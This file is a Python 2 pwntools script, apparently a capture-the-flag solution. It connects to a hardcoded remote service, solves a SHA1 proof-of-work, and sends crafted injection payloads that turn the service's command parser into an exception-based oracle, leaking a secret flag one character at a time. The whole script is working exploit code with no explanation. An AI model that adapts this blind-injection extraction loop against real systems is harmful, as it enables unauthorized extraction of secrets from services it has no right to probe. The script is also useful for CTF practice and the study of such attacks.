#!/usr/bin/env python2

from pwn import *
import time
import hashlib

context.log_level = 'info'

def testcmd(cmd):
    conn = remote("34.92.121.149", 54321)
    line = conn.recvline().strip()
    prefix = line.split('"')[1]
    log.debug("Prefix is %s" % prefix)
    n = 0

    while True:
        input = str(n)

        if hashlib.sha1(input).hexdigest()[:4] == prefix:
            conn.send(input)
            conn.send("\n")
            conn.clean()
            break

        n += 1
    conn.send(cmd)
    #time.sleep(.01)
    line = conn.recvall()
    conn.close()

    return line.strip()

startpos = 0
chars = list(set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]"))
flag = ""

for posoffset in range(80):
    position = startpos + posoffset
    flagchar = "?"

    print "Testing position", position

    p = log.progress("Trying character at position %s" % position)

    for testcharidx, c in enumerate(chars):
        p.status("Testing char %s", c)

        payload = "[[c][0]for[c]in[valid_event_chars][0]][%s]in[session[args[0]]][0][%s]or[load_flag_handler][0]114514log\n" % (testcharidx, position)
        log.debug("Sending payload: %s" % payload)
        resp = testcmd(payload)
        log.debug("Response: %s" % resp)

        if resp.startswith("$ exception"):
            p.success("Found character: %s" %c)
            flagchar = c
            break

    flag += flagchar
    print flagchar
    print "Flag:", flag
    log.info("Flag: %s" % flag)

print "Flag:", flag
